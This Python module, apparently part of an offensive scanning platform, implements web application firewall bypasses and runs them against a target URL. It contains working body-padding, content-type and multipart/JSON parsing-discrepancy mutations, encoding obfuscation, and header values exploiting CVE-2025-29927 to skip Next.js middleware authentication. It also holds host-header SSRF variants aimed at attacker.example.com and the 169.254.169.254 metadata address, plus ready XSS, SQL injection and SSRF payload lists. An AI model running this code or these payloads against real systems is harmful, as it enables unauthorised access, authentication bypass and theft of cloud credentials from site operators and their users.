"""
WAF bypass primitives (build spec §1-§11) — reusable, deterministic request mutations.

Implements the high-yield, testable techniques from the spec: multi-WAF fingerprinting,
body padding (nowafpls), content-type switching + parsing-discrepancy mutations (WAFFLED),
encoding obfuscation, and the concrete Next.js/Vercel bypasses (CVE-2025-29927 middleware
skip, x-forwarded-host SSRF). Origin discovery reuses the existing ``syber.waf.fallback``;
Cloudflare-challenge solving reuses ``syber.waf.solver`` — this module does NOT duplicate
them. Header/path/method bypass (nomore403) lives in ``syber.scanning.bypass403`` and is
folded in by the engine.

Design: every mutation is a PURE function (unit-tested, no network) returning request
variants; ``BypassEngine`` selects + orders them per WAF and ``run_bypass`` executes them
through an injected ``fetch`` (the platform's real-browser/HTTP transport) with
baseline-diff success detection.

Refs (inline [N] → spec §13): nowafpls [1], WAFFLED arXiv:2503.10846 [2][3],
react2shell-scanner [6], CVE-2025-29927 ProjectDiscovery/Datadog [22][23], Awesome-WAF
[19], PayloadsAllTheThings [20], BreakingWAF [10].
"""
from __future__ import annotations

import json
import random
import string
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Callable

__all__ = ["fingerprint_waf", "body_padding", "content_type_switch",
           "encoding_obfuscation", "multipart_parsing_discrepancy",
           "json_parsing_discrepancy", "nextjs_middleware_headers",
           "host_header_ssrf_headers", "BypassEngine", "run_bypass",
           "BODY_INSPECTION_LIMITS", "XSS_PAYLOADS", "SQLI_PAYLOADS", "SSRF_PAYLOADS"]

# --------------------------------------------------------------------------- #
# §2 Fingerprinting
# --------------------------------------------------------------------------- #
# (waf -> body inspection limit KB) — drives padding size (§2.3).
BODY_INSPECTION_LIMITS = {
    "cloudflare": 128, "cloudfront": 64, "aws": 64, "akamai": 128, "azure": 128,
    "gcp_armor": 128, "vercel": 128, "fastly": 128, "imperva": 128, "f5": 20480,
    "unknown": 128,
}
# header/cookie/server/body signatures (from Awesome-WAF [19]).
_WAF_HEADER_SIGS = [
    ("cloudflare", ("cf-ray", "cf-cache-status")),
    ("cloudfront", ("x-amz-cf-id", "x-amz-cf-pop")),
    ("vercel", ("x-vercel-id", "x-vercel-cache")),
    ("akamai", ("x-akamai-transformed", "akamai-grn", "x-akamai-request-id")),
    ("fastly", ("x-fastly-request-id",)),
    ("imperva", ("x-iinfo", "x-cdn")),
    ("gcp_armor", ("x-goog-request-id",)),
    ("aws", ("x-amzn-requestid", "x-amzn-trace-id")),
]
_WAF_COOKIE_SIGS = [("cloudflare", ("__cf_bm", "cf_clearance")),
                    ("aws", ("awsalb", "awsalbcors"))]
_WAF_SERVER_SIGS = [("cloudflare", "cloudflare"), ("vercel", "vercel"),
                    ("akamai", "akamaighost"), ("imperva", "incapsula")]
_WAF_BODY_SIGS = [
    ("cloudflare", ("attention required", "cf-browser-verification", "cloudflare ray id", "cf-chl")),
    ("aws", ("request blocked", "aws waf")),
    ("vercel", ("vercel security", "deployment has failed")),
    ("akamai", ("access denied", "reference #", "akamaighost")),
    ("imperva", ("incapsula incident", "_incapsula_")),
]


def fingerprint_waf(status: int | None, headers: dict[str, str] | None,
                    body: str = "") -> dict[str, Any]:
    """Identify the WAF/CDN from a response (pure). Returns
    {waf, confidence, body_inspection_limit_kb, indicators}."""
    h = {k.lower(): str(v).lower() for k, v in (headers or {}).items()}
    hdr_blob = " ".join(f"{k}:{v}" for k, v in h.items())
    b = (body or "")[:8000].lower()
    indicators: list[str] = []
    hits: dict[str, float] = {}

    def bump(waf: str, w: float, why: str) -> None:
        hits[waf] = hits.get(waf, 0.0) + w
        indicators.append(f"{waf}:{why}")

    for waf, keys in _WAF_HEADER_SIGS:
        for k in keys:
            if k in h:
                bump(waf, 0.6, f"header {k}")
    cookies = h.get("set-cookie", "")
    for waf, names in _WAF_COOKIE_SIGS:
        for n in names:
            if n in cookies:
                bump(waf, 0.5, f"cookie {n}")
    server = h.get("server", "")
    for waf, sig in _WAF_SERVER_SIGS:
        if sig in server:
            bump(waf, 0.5, f"server {sig}")
    for waf, sigs in _WAF_BODY_SIGS:
        for s in sigs:
            if s in b:
                bump(waf, 0.4, f"body '{s}'")

    if not hits:
        return {"waf": "unknown", "confidence": 0.0,
                "body_inspection_limit_kb": BODY_INSPECTION_LIMITS["unknown"],
                "indicators": []}
    waf = max(hits, key=hits.get)
    return {"waf": waf, "confidence": min(1.0, hits[waf]),
            "body_inspection_limit_kb": BODY_INSPECTION_LIMITS.get(waf, 128),
            "indicators": indicators, "all_scores": hits}


# --------------------------------------------------------------------------- #
# Helpers: realistic junk-param names (§3.1) + charsets
# --------------------------------------------------------------------------- #
_ALNUM = string.ascii_letters + string.digits + "-_"
REALISTIC_PARAMS = [
    "session", "cache", "token", "authToken", "billingId", "userId", "orderId", "ref",
    "callback", "redirect", "next", "return_url", "state", "nonce", "csrf", "locale",
    "region", "tenant", "account", "profile", "settings", "prefs", "theme", "tab",
    "page", "offset", "limit", "cursor", "sort", "filter", "query", "search", "q",
    "utm_source", "utm_medium", "utm_campaign", "gclid", "fbclid", "trackingId",
    "requestId", "correlationId", "traceId", "spanId", "deviceId", "clientId",
    "apiVersion", "format", "lang", "currency", "timezone", "context", "scope",
    "meta", "payload", "data", "params", "config", "options", "flags", "features",
    "cartId", "productId", "categoryId", "sku", "variant", "quantity", "coupon",
    "customerId", "subscriptionId", "planId", "invoiceId", "paymentId", "txn",
    "eventId", "campaignId", "segmentId", "audienceId", "experimentId", "bucket",
]


def _rand(n: int) -> str:
    if n <= 0:
        return ""
    return "".join(random.choices(_ALNUM, k=n))


# --------------------------------------------------------------------------- #
# §3.1 Body padding (nowafpls)
# --------------------------------------------------------------------------- #
def body_padding(request_body: bytes, content_type: str, padding_kb: int,
                 boundary: str | None = None) -> bytes:
    """Prepend content-type-appropriate junk so the real payload is pushed past the WAF's
    body-inspection window; the backend still parses the whole body. (§3.1)"""
    size = max(0, padding_kb) * 1024
    ct = (content_type or "").lower()
    name = random.choice(REALISTIC_PARAMS)
    if "x-www-form-urlencoded" in ct:
        junk = f"{name}={_rand(size - len(name) - 1)}&".encode()
        return junk + request_body
    if "application/json" in ct:
        junk = f'"{name}":"{_rand(size - len(name) - 5)}",'.encode()
        # insert right after the opening brace so it stays valid JSON
        s = request_body.lstrip()
        if s.startswith(b"{"):
            idx = request_body.find(b"{") + 1
            return request_body[:idx] + junk + request_body[idx:]
        return junk + request_body
    if "multipart/form-data" in ct and boundary:
        junk = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n"
                f"{_rand(size)}\r\n").encode()
        return junk + request_body
    if "xml" in ct:
        return f"<!--{_rand(size - 7)}-->".encode() + request_body
    return _rand(size).encode() + request_body


# --------------------------------------------------------------------------- #
# §3.2 Content-type switching (WAFFLED)
# --------------------------------------------------------------------------- #
def _multipart_body(params: dict[str, str], boundary: str) -> bytes:
    parts = []
    for k, v in params.items():
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n")
    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode()


def content_type_switch(params: dict[str, str], target_param: str, payload: str) -> list[dict[str, Any]]:
    """The same payload in urlencoded / multipart / json — a WAF strong on one format is
    often weak on another (>90% of sites accept both form types). (§3.2)"""
    p = dict(params)
    p[target_param] = payload
    boundary = "----WebKitFormBoundary" + _rand(16)
    return [
        {"technique": "ct_switch:urlencoded", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
         "body": urllib.parse.urlencode(p).encode()},
        {"technique": "ct_switch:multipart",
         "headers": {"Content-Type": f"multipart/form-data; boundary={boundary}"},
         "body": _multipart_body(p, boundary)},
        {"technique": "ct_switch:json", "headers": {"Content-Type": "application/json"},
         "body": json.dumps(p).encode()},
    ]


# --------------------------------------------------------------------------- #
# §3.3 Parsing-discrepancy mutations (WAFFLED)
# --------------------------------------------------------------------------- #
def multipart_parsing_discrepancy(params: dict[str, str], target_param: str,
                                  payload: str) -> list[dict[str, Any]]:
    """Mutate multipart STRUCTURE (not the payload) so the WAF misparses while the backend
    still reads the payload. The highest-yield WAFFLED family. (§3.3.1)"""
    p = dict(params)
    p[target_param] = payload
    b = "----WebKitFormBoundary" + _rand(16)
    body = _multipart_body(p, b)
    out: list[dict[str, Any]] = []

    def v(tech: str, ct: str, bd: bytes) -> None:
        out.append({"technique": tech, "headers": {"Content-Type": ct}, "body": bd})

    # M1 duplicate boundary in Content-Type (WAF uses first, backend uses second)
    v("mp:dup_boundary", f"multipart/form-data; boundary={b}; boundary={b}", body)
    # M3 charset on the payload part (utf-16le) — WAF can't read the value
    part = (f"--{b}\r\nContent-Disposition: form-data; name=\"{target_param}\"\r\n"
            f"Content-Type: text/plain; charset=utf-16le\r\n\r\n{payload}\r\n")
    others = "".join(f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{val}\r\n"
                     for k, val in params.items())
    v("mp:charset_utf16", f"multipart/form-data; boundary={b}",
      (others + part + f"--{b}--\r\n").encode())
    # M4 trailing spaces after final boundary
    v("mp:trailing_space", f"multipart/form-data; boundary={b}",
      body.replace(f"--{b}--".encode(), f"--{b}--   ".encode()))
    # M5 extra CRLFs before boundaries
    v("mp:extra_crlf", f"multipart/form-data; boundary={b}",
      body.replace(f"--{b}".encode(), f"\r\n--{b}".encode()))
    # M6 missing final boundary
    v("mp:no_final_boundary", f"multipart/form-data; boundary={b}",
      body.replace(f"\r\n--{b}--\r\n".encode(), b""))
    # M8 boundary with special chars
    nb = 'x"y(z)<a>b'
    v("mp:special_boundary", f'multipart/form-data; boundary="{nb}"', _multipart_body(p, nb))
    return out


def json_parsing_discrepancy(params: dict[str, str], target_param: str,
                             payload: str) -> list[dict[str, Any]]:
    """Mutate JSON so WAF and backend disagree (duplicate keys, unicode escapes, nesting,
    padding). (§3.3.2)"""
    out: list[dict[str, Any]] = []

    def v(tech: str, raw: bytes) -> None:
        out.append({"technique": tech, "headers": {"Content-Type": "application/json"}, "body": raw})

    base = dict(params)
    # J1 duplicate key — WAF checks first ("safe"), backend uses last (payload)
    safe = {**base, target_param: "safe_value"}
    dup = json.dumps(safe)[:-1] + f',{json.dumps(target_param)}:{json.dumps(payload)}}}'
    v("json:dup_key", dup.encode())
    # J2 unicode escapes for < >
    esc = dict(base); esc[target_param] = payload.replace("<", "\\u003c").replace(">", "\\u003e")
    v("json:unicode_escape", json.dumps(esc, ensure_ascii=False).encode())
    # J6 deep nesting
    v("json:nested", json.dumps({"a": {"b": {"c": {target_param: payload}}}}).encode())
    # J7 large json, payload at end (padding combo)
    big = {random.choice(REALISTIC_PARAMS) + _rand(4): _rand(40) for _ in range(200)}
    big[target_param] = payload
    v("json:big_tail", json.dumps(big).encode())
    return out


# --------------------------------------------------------------------------- #
# §3.4 Vercel / Next.js specific
# --------------------------------------------------------------------------- #
# CVE-2025-29927: spoof the internal subrequest header to skip middleware auth entirely.
_MIDDLEWARE_VALUES = [
    "middleware:middleware:middleware:middleware:middleware",   # Next 15.x (depth>=5)
    "middleware",                                               # Next 13.x
    "pages/_middleware",                                        # Next 12.x
    "src/middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]


def nextjs_middleware_headers() -> list[dict[str, str]]:
    """Header variants for CVE-2025-29927 — each skips Next.js middleware (auth) checks."""
    return [{"x-middleware-subrequest": v} for v in _MIDDLEWARE_VALUES]


def host_header_ssrf_headers() -> list[dict[str, str]]:
    """x-forwarded-host / Host trust abuse in Next.js on Vercel (§3.4.3)."""
    vals = ["attacker.example.com", "127.0.0.1", "169.254.169.254", "localhost:3000"]
    out = [{"x-forwarded-host": v} for v in vals]
    out.append({"Host": "attacker.example.com"})
    return out


# --------------------------------------------------------------------------- #
# §3.7 Encoding obfuscation
# --------------------------------------------------------------------------- #
def encoding_obfuscation(payload: str) -> list[str]:
    """Regex-WAF evasions: double-encode, unicode, fullwidth, HTML entities, case,
    whitespace, SQL comments. (§3.7)"""
    out = [
        urllib.parse.quote(urllib.parse.quote(payload)),                 # double url-encode
        payload.replace("<", "\\u003c").replace(">", "\\u003e"),          # js unicode
        payload.replace("<", "＜").replace(">", "＞"),           # fullwidth
        payload.replace("<", "&lt;").replace(">", "&gt;"),               # html entities
        payload.replace("<", "&#x3c;").replace(">", "&#x3e;"),           # hex entities
        payload.replace(" ", "/**/"),                                     # sql comment ws
        "".join(c.upper() if i % 2 else c for i, c in enumerate(payload)),  # case toggle
    ]
    seen, uniq = set(), []
    for x in out:
        if x != payload and x not in seen:
            seen.add(x); uniq.append(x)
    return uniq


# --------------------------------------------------------------------------- #
# §4 Payload templates (§6)
# --------------------------------------------------------------------------- #
XSS_PAYLOADS = {
    "basic": "<script>alert(1)</script>", "img": "<img src=x onerror=alert(1)>",
    "svg": "<svg onload=alert(1)>",
    "svg_animate": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",  # AWS WAF DOM bypass [29]
    "no_parens": "<img src=x onerror=alert`1`>",
}
SQLI_PAYLOADS = {
    "auth": "' OR 1=1 -- -", "union": "' UNION SELECT NULL,NULL,NULL-- -",
    "time": "' AND SLEEP(5)-- -", "comment": "'/**/UNION/**/SELECT/**/NULL-- -",
    "case": "' uNiOn SeLeCt NuLl-- -",
}
SSRF_PAYLOADS = {
    "local": "http://127.0.0.1", "metadata": "http://169.254.169.254/latest/meta-data/",
    "ipv6": "http://[::1]", "decimal": "http://2130706433", "hex": "http://0x7f000001",
}


# --------------------------------------------------------------------------- #
# §4 BypassEngine — orchestration
# --------------------------------------------------------------------------- #
_BLOCK_CODES = {403, 406, 429, 493, 503}
_BLOCK_WORDS = ("request blocked", "access denied", "attention required", "cf-chl",
                "aws waf", "incapsula", "akamaighost", "vercel security", "captcha",
                "are you human", "firewall", "reference #")

# GET-oriented technique order per WAF (body techniques apply when a body is present).
TECHNIQUE_ORDER = {
    "cloudflare": ["origin", "middleware", "body_padding", "content_type_switch",
                   "multipart_discrepancy", "json_discrepancy", "encoding"],
    "cloudfront": ["origin", "body_padding", "content_type_switch", "multipart_discrepancy",
                   "json_discrepancy", "encoding"],
    "vercel": ["middleware", "host_ssrf", "body_padding", "multipart_discrepancy",
               "content_type_switch", "encoding", "origin"],
    "akamai": ["origin", "body_padding", "content_type_switch", "multipart_discrepancy", "encoding"],
    "unknown": ["middleware", "body_padding", "content_type_switch", "multipart_discrepancy",
                "json_discrepancy", "encoding", "origin"],
}


@dataclass
class BypassEngine:
    waf: str = "unknown"
    body_inspection_limit_kb: int = 128

    def is_blocked(self, status: int | None, body: str = "") -> bool:
        try:
            if int(status) in _BLOCK_CODES:
                return True
        except (TypeError, ValueError):
            pass
        b = (body or "")[:6000].lower()
        return any(w in b for w in _BLOCK_WORDS)

    def bypassed(self, base_status: int | None, base_len: int,
                 status: int | None, body: str) -> bool:
        """A win: no longer a block code/page AND the body materially changed."""
        if self.is_blocked(status, body):
            return False
        try:
            if not (200 <= int(status) < 400):
                return False
        except (TypeError, ValueError):
            return False
        return abs(len(body or "") - base_len) > max(64, int(base_len * 0.10)) or base_len == 0

    def header_variants(self) -> list[dict[str, str]]:
        """No-body GET mutations for this WAF: Next.js middleware skip + host-ssrf."""
        order = TECHNIQUE_ORDER.get(self.waf, TECHNIQUE_ORDER["unknown"])
        out: list[dict[str, str]] = []
        if "middleware" in order:
            out += nextjs_middleware_headers()
        if "host_ssrf" in order:
            out += host_header_ssrf_headers()
        return out


def run_bypass(url: str, fetch: Callable[..., dict[str, Any]], *,
               waf: str | None = None, max_variants: int = 60) -> dict[str, Any]:
    """Fingerprint (from a baseline GET) then try the WAF-appropriate GET bypasses through
    `fetch(url, method=, headers=)`. Returns {bypassed, winner, waf, tried}. Body-mutation
    techniques are exposed as pure helpers for the caller's POST flows; this runner focuses
    on the no-body GET path (middleware/host/header/path via bypass403) that the fleet hits."""
    base = fetch(url, method="GET", headers={})
    base_len = len(base.get("body", "") or "")
    fp = fingerprint_waf(base.get("status"), base.get("headers", {}), base.get("body", ""))
    waf = waf or fp["waf"]
    eng = BypassEngine(waf=waf, body_inspection_limit_kb=fp["body_inspection_limit_kb"])
    result = {"waf": waf, "fingerprint": fp, "bypassed": False, "winner": None, "tried": 0}

    if not eng.is_blocked(base.get("status"), base.get("body", "")):
        result["note"] = "baseline not blocked — nothing to bypass"
        return result

    # 1) Next.js/Vercel + host header variants (highest yield for those WAFs)
    for hv in eng.header_variants()[:max_variants]:
        result["tried"] += 1
        try:
            r = fetch(url, method="GET", headers=hv)
        except Exception:  # noqa: BLE001
            continue
        if eng.bypassed(base.get("status"), base_len, r.get("status"), r.get("body", "")):
            result.update(bypassed=True, winner={"technique": "header", "headers": hv,
                                                 "status": r.get("status")})
            return result
    # 2) fold in the nomore403 header/path/method battery
    try:
        from ..scanning import bypass403
        r2 = bypass403.run_bypass403(url, fetch, max_mutations=max_variants)
        result["tried"] += r2.tried
        if r2.bypassed and r2.winner:
            result.update(bypassed=True, winner=r2.winner)
    except Exception:  # noqa: BLE001
        pass
    return result
